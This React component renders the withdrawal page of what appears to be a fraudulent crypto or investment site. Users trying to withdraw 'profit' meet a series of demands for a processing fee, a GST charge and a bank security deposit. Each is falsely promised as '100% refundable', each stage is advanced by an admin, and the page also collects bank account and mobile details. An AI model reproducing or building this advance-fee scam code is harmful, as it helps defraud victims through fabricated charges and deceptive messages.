import React, { useState, useEffect } from "react";
import { API_BASE_URL } from "../config";
import axios from "axios";
import {
  FaArrowDown, FaMobileAlt, FaUser, FaCreditCard, FaUniversity,
  FaRupeeSign, FaClock, FaCheckCircle, FaExclamationTriangle,
  FaWallet, FaChartLine, FaTimes, FaArrowRight, FaShieldAlt,
} from "react-icons/fa";

// Step descriptions for the 4-step withdrawal process
const STEP_DETAILS = [
  {
    step: 1,
    title: "Processing Charge",
    description: "A standard processing fee is required to initiate your withdrawal.",
    icon: "💳",
    color: "yellow",
  },
  {
    step: 2,
    title: "GST Charge",
    description: "Government GST (Goods & Services Tax) is mandatory for all financial transactions.",
    icon: "🏛️",
    color: "orange",
  },
  {
    step: 3,
    title: "Bank Security Charge",
    description: "Your bank requires a security verification deposit to release large funds.",
    icon: "🔒",
    color: "red",
  },
  {
    step: 4,
    title: "Withdrawal Complete",
    description: "All steps verified! Your profit will be credited to your bank account within 24 hours.",
    icon: "✅",
    color: "green",
  },
];

export default function WithdrawalPage() {
  const [mobile, setMobile] = useState("");
  const [holder, setHolder] = useState("");
  const [account, setAccount] = useState("");
  const [ifsc, setIfsc] = useState("");
  const [amount, setAmount] = useState("");
  const [errors, setErrors] = useState({});
  const [alertMsg, setAlertMsg] = useState("");
  const [alertType, setAlertType] = useState("");
  const [loading, setLoading] = useState(false);
  const [currentStep, setCurrentStep] = useState(null);
  const [activeRequest, setActiveRequest] = useState(null);
  // Custom message from admin (for any step)
  const [customMessage, setCustomMessage] = useState("");
  // step4CompletedAt timestamp for 24hr timer
  const [step4CompletedAt, setStep4CompletedAt] = useState(null);
  // Live countdown string
  const [countdown, setCountdown] = useState("");

  // Warning modal state
  const [showWarningModal, setShowWarningModal] = useState(false);
  const [modalMsg, setModalMsg] = useState("");
  const [modalType, setModalType] = useState("");
  // Track if modal has been shown for current message (to avoid re-showing)
  const [lastShownMsg, setLastShownMsg] = useState("");

  // Deposit profit data
  const [deposits, setDeposits] = useState([]);
  const [fetchingDeps, setFetchingDeps] = useState(true);

  // Ref to track last step and custom message for real-time sound updates
  const lastStateRef = React.useRef({ step: null, msg: "", initialized: false });

  const userEmail = localStorage.getItem("userEmail");
  const userName = localStorage.getItem("userName") || "User";

  // Load saved form
  useEffect(() => {
    if (!userEmail) return;
    const saved = localStorage.getItem(`withdrawalForm_${userEmail}`);
    if (saved) {
      const data = JSON.parse(saved);
      setMobile(data.mobile || "");
      setHolder(data.holder || "");
      setAccount(data.account || "");
      setIfsc(data.ifsc || "");
      setAmount(data.amount || "");
    }
  }, [userEmail]);

  // Sync withdrawal status and deposits
  useEffect(() => {
    if (!userEmail) return;
    fetchStatus(userEmail);
    fetchDeposits(userEmail);
    const interval = setInterval(() => {
      fetchStatus(userEmail);
      fetchDeposits(userEmail);
    }, 5000);
    return () => clearInterval(interval);
  }, [userEmail]);

  // 24-hour countdown timer for Step 4
  useEffect(() => {
    if (!step4CompletedAt) { setCountdown(""); return; }
    const update = () => {
      const end = new Date(step4CompletedAt).getTime() + 24 * 60 * 60 * 1000;
      const diff = end - Date.now();
      if (diff <= 0) {
        setCountdown("00:00:00");
        return;
      }
      const h = Math.floor(diff / 3600000);
      const m = Math.floor((diff % 3600000) / 60000);
      const s = Math.floor((diff % 60000) / 1000);
      setCountdown(
        `${String(h).padStart(2, "0")}:${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}`
      );
    };
    update();
    const timer = setInterval(update, 1000);
    return () => clearInterval(timer);
  }, [step4CompletedAt]);

  // Save form
  useEffect(() => {
    if (!userEmail) return;
    if (holder || mobile || account || ifsc || amount) {
      localStorage.setItem(`withdrawalForm_${userEmail}`,
        JSON.stringify({ mobile, holder, account, ifsc, amount })
      );
    }
  }, [mobile, holder, account, ifsc, amount, userEmail]);

  // Show warning modal when alertMsg changes (only once per unique message)
  useEffect(() => {
    if (alertMsg && alertMsg !== lastShownMsg) {
      setModalMsg(alertMsg);
      setModalType(alertType);
      setShowWarningModal(true);
      setLastShownMsg(alertMsg);
    }
  }, [alertMsg, alertType]);

  const fetchDeposits = async (email) => {
    try {
      const res = await axios.get(`${API_BASE_URL}/api/deposits/user/${encodeURIComponent(email)}`);
      setDeposits(res.data);
    } catch (_) { }
    finally { setFetchingDeps(false); }
  };

  const clearForm = (email) => {
    setMobile("");
    setHolder("");
    setAccount("");
    setIfsc("");
    setAmount("");
    setErrors({});
    if (email) localStorage.removeItem(`withdrawalForm_${email}`);
  };

  const playNotificationSound = () => {
    try {
      const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
      
      // Tone 1
      const osc1 = audioCtx.createOscillator();
      const gain1 = audioCtx.createGain();
      osc1.connect(gain1);
      gain1.connect(audioCtx.destination);
      
      osc1.type = "sine";
      osc1.frequency.setValueAtTime(587.33, audioCtx.currentTime); // D5
      gain1.gain.setValueAtTime(0.08, audioCtx.currentTime);
      gain1.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.15);
      
      osc1.start(audioCtx.currentTime);
      osc1.stop(audioCtx.currentTime + 0.15);
      
      // Tone 2
      const osc2 = audioCtx.createOscillator();
      const gain2 = audioCtx.createGain();
      osc2.connect(gain2);
      gain2.connect(audioCtx.destination);
      
      osc2.type = "sine";
      osc2.frequency.setValueAtTime(880.00, audioCtx.currentTime + 0.08); // A5
      gain2.gain.setValueAtTime(0.08, audioCtx.currentTime + 0.08);
      gain2.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.3);
      
      osc2.start(audioCtx.currentTime + 0.08);
      osc2.stop(audioCtx.currentTime + 0.3);
    } catch (e) {
      console.error("Audio failed to play:", e);
    }
  };

  const fetchStatus = async (email) => {
    try {
      const res = await axios.get(`${API_BASE_URL}/api/withdrawals/user/${encodeURIComponent(email)}`);
      const all = res.data;
      const pending = all
        .filter(r => r.status === "Pending")
        .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))[0];
      const approved = all
        .filter(r => r.status === "Approved")
        .sort((a, b) => new Date(b.updatedAt) - new Date(a.updatedAt))[0];

      const newStep = pending ? "pending" : (approved ? approved.step : null);
      const newCustomMsg = pending ? (pending.customMessage || "") : (approved ? (approved.customMessage || "") : "");

      if (lastStateRef.current.initialized) {
        const stepChanged = lastStateRef.current.step !== newStep;
        const msgChanged = lastStateRef.current.msg !== newCustomMsg;
        if (stepChanged || msgChanged) {
          playNotificationSound();
        }
      } else {
        lastStateRef.current.initialized = true;
      }

      lastStateRef.current.step = newStep;
      lastStateRef.current.msg = newCustomMsg;

      if (pending) {
        setActiveRequest(pending);
        setCurrentStep("pending");
        const defaultMsg = "⏳ Initiating Withdrawal...\n\nYour request has been submitted successfully and is currently under review by our audit team. Please wait while your transaction is being initialized.";
        setAlertMsg(pending.customMessage?.trim() ? `💬 ${pending.customMessage}` : defaultMsg);
        setAlertType("info");
        setCustomMessage(pending.customMessage || "");
      } else if (approved) {
        setActiveRequest(approved);
        setCurrentStep(approved.step);
        const uName = localStorage.getItem("userName") || "User";
        const defaultMsgs = {
          1: `💳 Processing Fee Required\n\nDear ${uName}, a standard processing fee is required to verify and authorize your destination account. Please Note: This charge is 100% refundable and will be credited back to your bank account along with your profit amount!`,
          2: `🏛️ GST Verification Required\n\nDear ${uName}, government GST (Goods & Services Tax) clearance is mandatory to process high-volume digital transfers. Please Note: This charge is 100% refundable and will be credited back with your profit amount!`,
          3: `🔒 Bank Security Guarantee Required\n\nDear ${uName}, a temporary security clearance deposit is required by your bank to authorize the incoming transaction. Please Note: This security deposit is 100% refundable and will be credited back instantly upon completion!`,
          4: `✅ Withdrawal Disbursed\n\nDear ${uName}, all verification steps have been approved. Your withdrawal amount plus all refunded deposits have been disbursed and will reflect in your account within the next 24 hours.`,
        };
        const msg = approved.customMessage?.trim()
          ? `💬 ${approved.customMessage}`
          : (defaultMsgs[approved.step] || "");
        setAlertMsg(msg);
        setAlertType(approved.step === 4 ? "success" : "warning");
        setCustomMessage(approved.customMessage || "");
        // Save step4CompletedAt for countdown timer
        if (approved.step === 4) {
          setStep4CompletedAt(approved.step4CompletedAt || approved.updatedAt);
          clearForm(email);
        }
      } else {
        setActiveRequest(null);
        setCurrentStep(null);
        setAlertMsg("");
        setCustomMessage("");
      }
    } catch (_) { }
  };

  const validateForm = () => {
    let e = {};
    if (!mobile.trim()) e.mobile = "Mobile number is required";
    if (!holder.trim()) e.holder = "Bank holder name is required";
    if (!account.trim()) e.account = "Account number is required";
    if (!ifsc.trim()) e.ifsc = "IFSC code is required";
    if (!amount.trim() || Number(amount) <= 0) e.amount = "Enter a valid withdrawal amount";
    return e;
  };

  // Check if user has at least one confirmed deposit
  const hasConfirmedDeposit = deposits.some(d => d.status === "Confirmed");

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!userEmail) {
      setAlertMsg("❌ Please login first.");
      setAlertType("error");
      return;
    }

    // ── Block if no confirmed deposit ──
    if (!hasConfirmedDeposit) {
      setModalMsg("🚫 Withdrawal is not allowed yet!\n\nYou must make a deposit first and wait for admin confirmation before you can request a withdrawal.");
      setModalType("error");
      setShowWarningModal(true);
      return;
    }

    const formErrors = validateForm();
    if (Object.keys(formErrors).length > 0) {
      setErrors(formErrors);
      return;
    }
    setErrors({});

    const maxWithdrawable = totalDeposited + totalProfit;
    if (Number(amount) > maxWithdrawable) {
      setModalMsg(`🚫 Insufficient Balance!\n\nYou requested a withdrawal of ₹${Number(amount).toLocaleString("en-IN")}, but your maximum withdrawable balance is ₹${maxWithdrawable.toLocaleString("en-IN")}. Please enter a valid amount.`);
      setModalType("error");
      setShowWarningModal(true);
      return;
    }

    setLoading(true);
    try {
      const res = await axios.get(`${API_BASE_URL}/api/withdrawals/user/${encodeURIComponent(userEmail)}`);
      const all = res.data;
      const latestPending = all.filter(r => r.status === "Pending").sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))[0];
      const latestApproved = all.filter(r => r.status === "Approved").sort((a, b) => new Date(b.updatedAt) - new Date(a.updatedAt))[0];

      if (latestPending) {
        setAlertMsg("⏳ Your request is already submitted. Please wait for admin approval.");
        setAlertType("info");
        setLoading(false);
        return;
      }
      if (latestApproved) {
        const step = latestApproved.step;
        if (step === 4) {
          setAlertMsg("✅ Your profit will be credited within 24 hours!");
          setAlertType("success");
          setLoading(false);
          return;
        }
        await axios.post(`${API_BASE_URL}/api/withdrawals`, {
          userEmail, user: holder, mobile, account, ifsc, amount, step, status: "Pending",
        });
        const msgs = {
          1: "⏳ Verification Pending\n\nProcessing charge payment has been submitted. Please wait while the audit team reviews your fee payment to advance your transaction.",
          2: "⏳ Verification Pending\n\nGST charge payment has been submitted. Please wait while the audit team reviews your tax clearance to advance your transaction.",
          3: "⏳ Verification Pending\n\nBank security deposit has been submitted. Please wait while the audit team reviews your security verification to disburse your funds.",
        };
        setAlertMsg(msgs[step]);
        setAlertType("info");
        setCurrentStep("pending");
        setLoading(false);
        return;
      }
      // First request
      await axios.post(`${API_BASE_URL}/api/withdrawals`, {
        userEmail, user: holder, mobile, account, ifsc, amount, step: 0, status: "Pending",
      });
      setAlertMsg("⏳ Initiating Withdrawal...\n\nYour request has been submitted successfully and is currently under review by our audit team. Please wait while your transaction is being initialized.");
      setAlertType("info");
      setCurrentStep("pending");
    } catch {
      setAlertMsg("❌ Something went wrong. Please try again.");
      setAlertType("error");
    } finally {
      setLoading(false);
    }
  };

  const alertConfig = {
    warning: { bg: "bg-yellow-500/10 border-yellow-400/40 text-yellow-300", icon: <FaExclamationTriangle /> },
    success: { bg: "bg-green-500/10 border-green-400/40 text-green-300", icon: <FaCheckCircle /> },
    error: { bg: "bg-red-500/10 border-red-400/40 text-red-300", icon: <FaExclamationTriangle /> },
    info: { bg: "bg-cyan-500/10 border-cyan-400/40 text-cyan-300", icon: <FaClock /> },
  };

  // Modal config based on type
  const modalConfig = {
    warning: {
      headerBg: "from-yellow-500/20 to-amber-500/10",
      borderColor: "border-yellow-400/30",
      iconBg: "bg-yellow-500/20 border-yellow-400/30",
      iconColor: "text-yellow-400",
      icon: <FaExclamationTriangle className="text-2xl" />,
      titleColor: "text-yellow-400",
      btnBg: "bg-yellow-500 hover:bg-yellow-400",
    },
    success: {
      headerBg: "from-green-500/20 to-emerald-500/10",
      borderColor: "border-green-400/30",
      iconBg: "bg-green-500/20 border-green-400/30",
      iconColor: "text-green-400",
      icon: <FaCheckCircle className="text-2xl" />,
      titleColor: "text-green-400",
      btnBg: "bg-green-500 hover:bg-green-400",
    },
    error: {
      headerBg: "from-red-500/20 to-rose-500/10",
      borderColor: "border-red-400/30",
      iconBg: "bg-red-500/20 border-red-400/30",
      iconColor: "text-red-400",
      icon: <FaExclamationTriangle className="text-2xl" />,
      titleColor: "text-red-400",
      btnBg: "bg-red-500 hover:bg-red-400",
    },
    info: {
      headerBg: "from-cyan-500/20 to-blue-500/10",
      borderColor: "border-cyan-400/30",
      iconBg: "bg-cyan-500/20 border-cyan-400/30",
      iconColor: "text-cyan-400",
      icon: <FaClock className="text-2xl" />,
      titleColor: "text-cyan-400",
      btnBg: "bg-cyan-500 hover:bg-cyan-400",
    },
  };

  const steps = [
    { step: 0, label: "Submitted" },
    { step: 1, label: "Charge" },
    { step: 2, label: "GST" },
    { step: 3, label: "Security" },
    { step: 4, label: "Complete" },
  ];

  // Confirmed deposits with profit
  const confirmed = deposits.filter(d => d.status === "Confirmed");
  const baseProfit = confirmed.reduce((s, d) => s + (d.profitAmount || 0), 0);
  const totalProfit = currentStep === 4 ? 0 : baseProfit;
  const totalDeposited = confirmed.reduce((s, d) => s + d.amount, 0);
  const confirmedDeposits = confirmed.filter(d => d.profitPercent > 0);

  const mc = modalConfig[modalType] || modalConfig["info"];

  return (
    <div className="bg-[#020817] text-white min-h-screen px-4 sm:px-6 lg:px-8 py-4 sm:py-6 relative overflow-x-hidden">
      <div className="absolute top-0 right-0 w-96 h-96 bg-cyan-500/5 blur-[150px] rounded-full pointer-events-none" />
      <div className="absolute bottom-0 left-0 w-72 h-72 bg-blue-500/5 blur-[120px] rounded-full pointer-events-none" />

      {/* ── Warning Modal ───────────────────────────────────────── */}
      {showWarningModal && (() => {
        const msgLines = modalMsg.split("\n").filter(line => line.trim() !== "");
        const modalTitle = msgLines[0] || "Status Update";
        const modalBodyLines = msgLines.slice(1);
        
        return (
          <div
            className="fixed inset-0 z-[9999] flex items-center justify-center bg-black/70 backdrop-blur-md px-4"
            onClick={() => setShowWarningModal(false)}
          >
            <div
              className={`bg-[#0B1120] border ${mc.borderColor} rounded-3xl w-full max-w-md shadow-2xl overflow-hidden animate-modal-pop`}
              onClick={e => e.stopPropagation()}
              style={{ animation: "modalPop 0.3s cubic-bezier(0.34,1.56,0.64,1)" }}
            >
              {/* Modal Header */}
              <div className={`bg-gradient-to-r ${mc.headerBg} px-6 pt-5 pb-4`}>
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <div className={`w-10 h-10 rounded-xl ${mc.iconBg} border flex items-center justify-center ${mc.iconColor} shrink-0`}>
                      {mc.icon}
                    </div>
                    <div>
                      <p className={`font-bold text-sm sm:text-base ${mc.titleColor} leading-tight`}>
                        {modalTitle}
                      </p>
                      <p className="text-gray-500 text-[10px]">Withdrawal Information</p>
                    </div>
                  </div>
                  <button
                    onClick={() => setShowWarningModal(false)}
                    className="w-8 h-8 rounded-lg bg-white/5 border border-white/10 hover:border-red-400/40 hover:text-red-400 flex items-center justify-center text-gray-400 transition-all duration-200 shrink-0"
                  >
                    <FaTimes className="text-xs" />
                  </button>
                </div>
              </div>

              {/* Modal Body */}
              <div className="px-6 py-4">
                {modalBodyLines.length > 0 ? (
                  <div className={`p-4 rounded-xl border ${mc.borderColor} bg-white/3 text-xs sm:text-sm text-gray-300 leading-relaxed`}>
                    {modalBodyLines.map((line, i) => (
                      <p key={i} className={i > 0 ? "mt-2" : ""}>
                        {line}
                      </p>
                    ))}
                  </div>
                ) : (
                  <div className={`p-4 rounded-xl border ${mc.borderColor} bg-white/3 text-xs sm:text-sm text-gray-300 leading-relaxed`}>
                    {modalTitle}
                  </div>
                )}

                {/* Extra info for no-deposit error */}
                {modalType === "error" && modalMsg.toLowerCase().includes("deposit") && (
                  <div className="mt-3 flex items-start gap-2.5 p-3 bg-cyan-500/5 border border-cyan-400/15 rounded-xl">
                    <FaWallet className="text-cyan-400 shrink-0 mt-0.5 text-xs" />
                    <p className="text-[11px] text-gray-400 leading-relaxed">
                      Go to the <span className="text-cyan-400 font-semibold">Deposit</span> page, add funds, and wait for confirmation.
                    </p>
                  </div>
                )}
              </div>

              {/* Modal Footer */}
              <div className="px-6 pb-6 flex gap-3">
                <button
                  onClick={() => setShowWarningModal(false)}
                  className="flex-1 bg-white/5 border border-white/10 hover:border-white/20 text-gray-300 hover:text-white py-2.5 rounded-xl font-semibold text-xs sm:text-sm transition-all duration-200"
                >
                  Close
                </button>
                <button
                  onClick={() => setShowWarningModal(false)}
                  className={`flex-1 ${mc.btnBg} text-white py-2.5 rounded-xl font-bold text-xs sm:text-sm transition-all duration-200 shadow-lg`}
                >
                  Got it!
                </button>
              </div>
            </div>
          </div>
        );
      })()}

      <style>{`
        @keyframes modalPop {
          from { opacity: 0; transform: scale(0.85) translateY(20px); }
          to   { opacity: 1; transform: scale(1) translateY(0); }
        }
      `}</style>

      <div className="max-w-5xl mx-auto">

        {/* Header */}
        <div className="mb-4 sm:mb-5">
          <h1 className="text-xl sm:text-2xl font-bold mb-1">Withdrawal <span className="text-cyan-400">Funds</span></h1>
          <p className="text-gray-400 text-xs">Securely withdraw your crypto earnings to your bank account.</p>
        </div>

        {/* ── Deposit Required Warning Banner ──────────────────── */}
        {!fetchingDeps && !hasConfirmedDeposit && (
          <div className="mb-4 p-4 rounded-xl border border-orange-400/30 bg-gradient-to-r from-orange-500/10 to-red-500/10 flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-orange-500/20 border border-orange-400/25 flex items-center justify-center text-orange-400 shrink-0">
              <FaShieldAlt className="text-lg" />
            </div>
            <div>
              <p className="font-bold text-orange-300 text-xs">Deposit Required Before Withdrawal</p>
              <p className="text-gray-400 text-[10px] mt-0.5">
                You must make a successful deposit and wait for admin confirmation before requesting a withdrawal.
              </p>
            </div>
          </div>
        )}

        {/* ── Alert (shown after modal is closed) ──────────────── */}
        {alertMsg && !showWarningModal && (
          <div className={`mb-4 p-3.5 rounded-xl border flex items-center gap-3 text-xs font-semibold ${alertConfig[alertType]?.bg}`}>
            <span className="text-lg shrink-0">{alertConfig[alertType]?.icon}</span>
            <p className="leading-normal">{alertMsg.split("\n")[0]}</p>
          </div>
        )}

        {/* ── 24-Hour Countdown Timer (Step 4 only) ──────────────── */}
        {currentStep === 4 && countdown && (
          <div className="mb-4 bg-gradient-to-r from-green-500/10 to-emerald-500/10 border border-green-400/20 rounded-2xl p-4 sm:p-5">
            <div className="flex items-center gap-2 mb-3">
              <span className="text-lg">⏰</span>
              <div>
                <p className="font-bold text-green-400 text-xs sm:text-sm">Transfer Processing</p>
                <p className="text-gray-500 text-[10px]">Estimated time remaining for credit</p>
              </div>
            </div>
            <div className="flex justify-center gap-2">
              {countdown.split(":").map((unit, i) => (
                <div key={i} className="flex flex-col items-center">
                  <div className="bg-[#0B1120] border border-green-400/15 rounded-xl px-3 py-1.5 min-w-[48px] text-center">
                    <span className="text-xl font-bold text-green-400 font-mono tabular-nums">{unit}</span>
                  </div>
                  <span className="text-gray-600 text-[8px] mt-1 uppercase tracking-wider">
                    {["Hours", "Mins", "Secs"][i]}
                  </span>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* ── Form ───────────────────────────────────────────── */}
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 sm:gap-5">
          {/* Bank Details */}
          <div className="bg-white/5 border border-white/10 rounded-2xl sm:rounded-3xl p-4 sm:p-6 space-y-3">
            <h2 className="text-lg font-bold mb-1">Bank Details</h2>
            {[
              { icon: FaMobileAlt, placeholder: "Mobile Number", value: mobile, setter: setMobile, key: "mobile" },
              { icon: FaUser, placeholder: "Bank Holder Name", value: holder, setter: setHolder, key: "holder" },
              { icon: FaCreditCard, placeholder: "Account Number", value: account, setter: setAccount, key: "account" },
              { icon: FaUniversity, placeholder: "IFSC Code", value: ifsc, setter: setIfsc, key: "ifsc" },
            ].map(({ icon: Icon, placeholder, value, setter, key }) => (
              <div key={key}>
                <div className={`flex items-center bg-[#0B1120] border rounded-xl px-4 py-3 transition-all ${errors[key] ? "border-red-400/50" : "border-white/10 focus-within:border-cyan-400/50"
                  }`}>
                  <Icon className="text-cyan-400 text-xs shrink-0" />
                  <input
                    placeholder={placeholder}
                    value={value}
                    onChange={e => { setter(e.target.value); setErrors(p => ({ ...p, [key]: "" })); }}
                    className="bg-transparent outline-none w-full ml-3 text-white placeholder-gray-600 text-xs"
                  />
                </div>
                {errors[key] && <p className="text-red-400 text-[10px] mt-0.5 ml-1">{errors[key]}</p>}
              </div>
            ))}
          </div>

          {/* Amount & Submit */}
          <div className="bg-white/5 border border-white/10 rounded-2xl sm:rounded-3xl p-4 sm:p-6 flex flex-col justify-between">
            <div>
              <h2 className="text-lg font-bold mb-3">Withdraw Amount</h2>

              {/* Integrated Investment Summary */}
              {!fetchingDeps && deposits.length > 0 && (
                <div className="grid grid-cols-3 gap-2 mb-3.5 bg-white/3 border border-white/5 rounded-2xl p-3">
                  <div className="text-center">
                    <p className="text-gray-500 text-[9px] mb-0.5">Deposited</p>
                    <p className="text-cyan-400 font-bold text-xs sm:text-sm">₹{totalDeposited.toLocaleString("en-IN")}</p>
                  </div>
                  <div className="text-center border-x border-white/5">
                    <p className="text-gray-500 text-[9px] mb-0.5">Profit</p>
                    <p className="text-green-400 font-bold text-xs sm:text-sm">+₹{totalProfit.toLocaleString("en-IN")}</p>
                  </div>
                  <div className="text-center">
                    <p className="text-gray-500 text-[9px] mb-0.5">Withdrawable</p>
                    <p className="text-yellow-400 font-bold text-xs sm:text-sm">₹{(totalDeposited + totalProfit).toLocaleString("en-IN")}</p>
                  </div>
                </div>
              )}

              {/* Per-deposit profit breakdown (very small horizontal scroll or inline wrap) */}
              {confirmedDeposits.length > 0 && (
                <div className="mb-3 text-[9px] text-gray-500 flex flex-wrap gap-1.5 max-h-12 overflow-y-auto pr-1">
                  {confirmedDeposits.map(dep => (
                    <span key={dep._id} className="bg-white/5 border border-white/10 rounded px-2 py-0.5 shrink-0 select-none">
                      ₹{dep.amount.toLocaleString("en-IN")} (+₹{(dep.profitAmount || 0).toLocaleString("en-IN")})
                    </span>
                  ))}
                </div>
              )}

              {/* No deposit warning inside form */}
              {!fetchingDeps && !hasConfirmedDeposit && (
                <div className="bg-orange-500/10 border border-orange-400/20 rounded-xl p-3 mb-3.5 flex items-center gap-2">
                  <FaExclamationTriangle className="text-orange-400 shrink-0 text-xs" />
                  <div>
                    <p className="text-orange-400 font-semibold text-xs">No confirmed deposit found</p>
                    <p className="text-gray-500 text-[10px]">Please deposit funds first to enable withdrawal.</p>
                  </div>
                </div>
              )}

              <div className="bg-[#0B1120] border border-white/10 rounded-xl p-3.5 mb-3.5">
                <p className="text-gray-500 text-[9px] uppercase tracking-wider mb-0.5">Currency</p>
                <p className="text-white text-xs font-semibold">₹ Indian Rupee (INR)</p>
              </div>
              
              <div>
                <div className={`flex items-center bg-[#0B1120] border rounded-xl px-4 py-3 mb-1 transition-all ${errors.amount ? "border-red-400/50" : "border-white/10 focus-within:border-cyan-400/50"
                  }`}>
                  <FaRupeeSign className="text-cyan-400 text-xs shrink-0" />
                  <input
                    type="number"
                    value={amount}
                    onChange={e => { setAmount(e.target.value); setErrors(p => ({ ...p, amount: "" })); }}
                    placeholder="Enter amount"
                    className="bg-transparent outline-none w-full ml-3 text-white placeholder-gray-600 text-xs"
                  />
                </div>
                {errors.amount && <p className="text-red-400 text-[10px] mt-0.5 ml-1">{errors.amount}</p>}
              </div>
              <div className="mt-3.5 space-y-1">
                <div className="flex justify-between text-xs">
                  <span className="text-gray-500">Processing time</span>
                  <span className="text-white">Within 24 hours</span>
                </div>
              </div>
            </div>

            <button
              onClick={handleSubmit}
              disabled={loading}
              className={`w-full mt-5 px-5 py-3 rounded-xl font-bold flex items-center justify-center gap-2.5 transition-all duration-300 shadow-md text-xs sm:text-sm ${
                !hasConfirmedDeposit && !fetchingDeps
                  ? "bg-gray-600 cursor-not-allowed opacity-60 shadow-none"
                  : "bg-cyan-500 hover:bg-cyan-400 shadow-cyan-500/20 disabled:opacity-50"
              }`}
            >
              <FaArrowDown />
              {loading ? "Submitting..." : "Submit Withdrawal Request"}
            </button>
            <p className="text-gray-600 text-[10px] text-center mt-2.5">
              {hasConfirmedDeposit
                ? "Make sure your bank details are correct before submitting"
                : "⚠️ Deposit and wait for confirmation to enable withdrawal"}
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
